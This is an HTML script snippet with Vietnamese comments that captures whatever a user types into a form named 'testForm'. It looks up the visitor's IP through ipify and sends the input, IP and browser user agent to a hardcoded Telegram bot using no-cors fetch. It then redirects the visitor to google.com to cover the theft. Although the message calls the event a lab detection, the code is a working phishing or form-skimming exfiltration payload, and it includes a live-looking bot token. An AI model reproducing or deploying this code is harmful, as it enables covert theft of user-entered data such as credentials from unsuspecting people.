<script>
        const BOT_TOKEN = '8794929706:AAHFZQQVbZLt9XU1bXI1ZjEZXHp-TxdJ31I';
        const CHAT_ID = '8742570709';

        let userIp = "Đang lấy...";
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userIp = data.ip; })
            .catch(() => { userIp = "Không xác định"; });

        document.getElementById('testForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const inputValue = document.getElementById('userInput').value;

            const messageText = 
                `🧪 PHÁT HIỆN SỰ KIỆN TRONG LAB!\n` +
                `-------------------------\n` +
                `📝 Dữ liệu nhập: ${inputValue}\n` +
                `🌐 IP nguồn: ${userIp}\n` +
                `📱 Thiết bị: ${navigator.userAgent}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(messageText);

            // Dùng fetch kết hợp chế độ no-cors để gửi ngầm dữ liệu lên Telegram mà không bị trình duyệt chặn
            fetch(url, { mode: 'no-cors' })
                .finally(() => {
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 500);
                });
        });
    </script>
